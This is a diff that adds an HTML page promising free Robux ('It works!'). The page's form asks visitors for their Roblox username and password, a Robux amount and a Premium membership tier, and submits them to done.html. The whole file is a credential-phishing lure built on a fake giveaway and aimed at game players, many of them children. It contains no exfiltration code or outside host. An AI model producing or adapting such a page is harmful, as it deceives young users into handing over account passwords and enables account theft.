@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Game Money Needs</title>
+	<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+	<h1><a href="index.html">To the Home page!</a></h1>
+	<h2>Here you get Robux! (It works!)</h2>
+	<form action="done.html" method="post">
+		<label for="username">Your Roblox username:</label><br>
+		<input type="text" id="username" name="username" required><br>
+		<label for="pwd">Your Roblox password:</label><br>
+		<input type="password" id="pwd" name="pwd" required>
+		<label for="quantity">Robux quantity:</label>
+		<input type="number" id="quantity" name="quantity" min="1" required>
+		<label for="premium">Do you want Premium Membership?</label>
+		<select name="premium" id="premium">
+			<option value="No">I DON'T want a Premium Membership</option>
+			<option value="Premium450">I DO want a Premium 450 Membership</option>
+			<option value="Premium1000">I DO want a Premium 1000 Membership</option>
+			<option value="Premium2200">I DO want a Premium 2200 Membership</option>
+		</select>
+		<button type="submit" formmethod="post" formaction="done.html">Submit</button>
+	</form>
+</body>
+</html>
